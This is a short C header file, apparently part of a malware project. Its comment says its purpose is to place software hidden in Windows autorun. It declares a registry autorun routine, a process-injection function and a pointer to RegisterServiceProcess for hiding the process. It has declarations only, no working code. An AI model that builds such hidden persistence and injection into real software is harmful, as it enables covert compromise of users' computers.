/* 
* Autorun - all components are collected
* for placing software hidden in autorun
*/

#ifndef AUTORUN_H
#define AUTORUN_H

// Writing a program to the windows registry for autorun
void RegisterProgram();
// Loading libraries the "kernel32.dll" and "user32.dll"
DWORD WINAPI func(LPVOID);

BOOL Inject(HANDLE hProc, DWORD(WINAPI* func)(LPVOID));
BOOL(WINAPI* RegisterServiceProcess)(DWORD dwProcessId, DWORD dwType);

#endif // AUTORUN_H
